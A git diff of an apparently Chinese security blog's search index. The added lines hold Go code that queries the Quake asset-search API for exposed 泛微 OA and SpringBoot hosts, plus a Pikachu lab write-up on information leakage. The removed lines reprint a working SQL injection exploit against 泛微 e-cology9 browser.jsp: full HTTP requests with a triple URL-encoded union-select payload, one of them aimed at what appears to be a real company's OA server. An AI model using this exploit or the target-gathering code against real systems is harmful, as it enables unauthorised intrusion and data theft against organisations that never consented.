@@ -33,6 +33,27 @@
       </categories>
   </entry>
   <entry>
+    <title>调用quake api找寻资产</title>
+    <url>/2023/05/04/ForGolang/%E8%B0%83%E7%94%A8quake%E7%9A%84api/</url>
+    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><a href="https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3">https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&amp;title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3</a></p>
+<h3 id="调用实时主机信息api"><a href="#调用实时主机信息api" class="headerlink" title="调用实时主机信息api"></a>调用实时主机信息api</h3><h5 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;https://quake.360.net/api/v3/search/quake_host&quot; -H &quot;X-QuakeToken: d17140ae-xxxx-xxx-xxxx-c0818b2bbxxx&quot; -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line">     &quot;query&quot;: &quot;service: http&quot;,</span><br><span class="line">     &quot;start&quot;: 20,</span><br><span class="line">     &quot;size&quot;: 10,</span><br><span class="line">     &quot;ignore_cache&quot;: false,</span><br><span class="line">     &quot;start_time&quot;: &quot;2021-01-01 00:00:00&quot;,</span><br><span class="line">     &quot;end_time&quot;: &quot;2021-02-01 00:00:00&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="返回值示例"><a href="#返回值示例" class="headerlink" title="返回值示例"></a>返回值示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 0,</span><br><span class="line">  &quot;message&quot;: &quot;Successful.&quot;,</span><br><span class="line">  &quot;data&quot;: [</span><br><span class="line">      // 返回数据</span><br><span class="line">  ],</span><br><span class="line">  &quot;meta&quot;: &#123;</span><br><span class="line">    &quot;pagination&quot;: &#123;</span><br><span class="line">      &quot;count&quot;: 1,</span><br><span class="line">      &quot;page_index&quot;: 1,</span><br><span class="line">      &quot;page_size&quot;: 1,</span><br><span class="line">      &quot;total&quot;: 68184</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="golang实现"><a href="#golang实现" class="headerlink" title="golang实现"></a>golang实现</h5><p>将json数据中的ip和端口信息提取出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;泛微协同办公OA&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 100</span><br><span class="line">	ignore_cache = false</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-25 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetIp() &#123;</span><br><span class="line">	//配置body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		fmt.Println(ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="判断是http还是https"><a href="#判断是http还是https" class="headerlink" title="判断是http还是https"></a>判断是http还是https</h5><p>quake的返回包中存在一个name字段，http就是http请求，http&#x2F;ssl就是https</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">	//name用于判断是http还是https</span><br><span class="line">	name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">	ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">	port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">	if name == &quot;http&quot; &#123;</span><br><span class="line">		url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">		url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最终的quake查找url的代码"><a href="#最终的quake查找url的代码" class="headerlink" title="最终的quake查找url的代码"></a>最终的quake查找url的代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;SpringBoot框架&quot; AND country_cn: &quot;中国&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 5000</span><br><span class="line">	ignore_cache = true</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-28 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetURL() []string &#123;</span><br><span class="line">	//配置请求包的body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	var urlArr []string</span><br><span class="line">	url := &quot;&quot;</span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	name := &quot;&quot;</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		//name用于判断是http还是https</span><br><span class="line">		name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		if name == &quot;http&quot; &#123;</span><br><span class="line">			url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">			url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125;</span><br><span class="line">		urlArr = append(urlArr, url)</span><br><span class="line">	&#125;</span><br><span class="line">	return urlArr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ForGolang</category>
+      </categories>
+  </entry>
+  <entry>
     <title>使用github搭建个人博客</title>
     <url>/2023/05/04/ForGithub/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93</a></p>
@@ -354,60 +375,21 @@
       </categories>
   </entry>
   <entry>
-    <title>调用quake api找寻资产</title>
-    <url>/2023/05/04/ForGolang/%E8%B0%83%E7%94%A8quake%E7%9A%84api/</url>
-    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><a href="https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3">https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&amp;title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3</a></p>
-<h3 id="调用实时主机信息api"><a href="#调用实时主机信息api" class="headerlink" title="调用实时主机信息api"></a>调用实时主机信息api</h3><h5 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;https://quake.360.net/api/v3/search/quake_host&quot; -H &quot;X-QuakeToken: d17140ae-xxxx-xxx-xxxx-c0818b2bbxxx&quot; -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line">     &quot;query&quot;: &quot;service: http&quot;,</span><br><span class="line">     &quot;start&quot;: 20,</span><br><span class="line">     &quot;size&quot;: 10,</span><br><span class="line">     &quot;ignore_cache&quot;: false,</span><br><span class="line">     &quot;start_time&quot;: &quot;2021-01-01 00:00:00&quot;,</span><br><span class="line">     &quot;end_time&quot;: &quot;2021-02-01 00:00:00&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-敏感信息泄露</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
+    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
+<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
+<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
+<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
+<p>成功登录</p>
+<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
+<p>并且发现，该后台为未授权接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
 
-<h5 id="返回值示例"><a href="#返回值示例" class="headerlink" title="返回值示例"></a>返回值示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 0,</span><br><span class="line">  &quot;message&quot;: &quot;Successful.&quot;,</span><br><span class="line">  &quot;data&quot;: [</span><br><span class="line">      // 返回数据</span><br><span class="line">  ],</span><br><span class="line">  &quot;meta&quot;: &#123;</span><br><span class="line">    &quot;pagination&quot;: &#123;</span><br><span class="line">      &quot;count&quot;: 1,</span><br><span class="line">      &quot;page_index&quot;: 1,</span><br><span class="line">      &quot;page_size&quot;: 1,</span><br><span class="line">      &quot;total&quot;: 68184</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="golang实现"><a href="#golang实现" class="headerlink" title="golang实现"></a>golang实现</h5><p>将json数据中的ip和端口信息提取出来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;泛微协同办公OA&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 100</span><br><span class="line">	ignore_cache = false</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-25 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetIp() &#123;</span><br><span class="line">	//配置body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		fmt.Println(ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="判断是http还是https"><a href="#判断是http还是https" class="headerlink" title="判断是http还是https"></a>判断是http还是https</h5><p>quake的返回包中存在一个name字段，http就是http请求，http&#x2F;ssl就是https</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">	//name用于判断是http还是https</span><br><span class="line">	name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">	ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">	port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">	if name == &quot;http&quot; &#123;</span><br><span class="line">		url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">		url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="最终的quake查找url的代码"><a href="#最终的quake查找url的代码" class="headerlink" title="最终的quake查找url的代码"></a>最终的quake查找url的代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;SpringBoot框架&quot; AND country_cn: &quot;中国&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 5000</span><br><span class="line">	ignore_cache = true</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-28 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetURL() []string &#123;</span><br><span class="line">	//配置请求包的body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	var urlArr []string</span><br><span class="line">	url := &quot;&quot;</span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	name := &quot;&quot;</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		//name用于判断是http还是https</span><br><span class="line">		name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		if name == &quot;http&quot; &#123;</span><br><span class="line">			url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">			url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125;</span><br><span class="line">		urlArr = append(urlArr, url)</span><br><span class="line">	&#125;</span><br><span class="line">	return urlArr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
-        <category>ForGolang</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>泛微e-cology9 browser.jsp SQL注入</title>
-    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
-
-<p>sql语句经过了三层全字符的url编码</p>
-<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
-<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
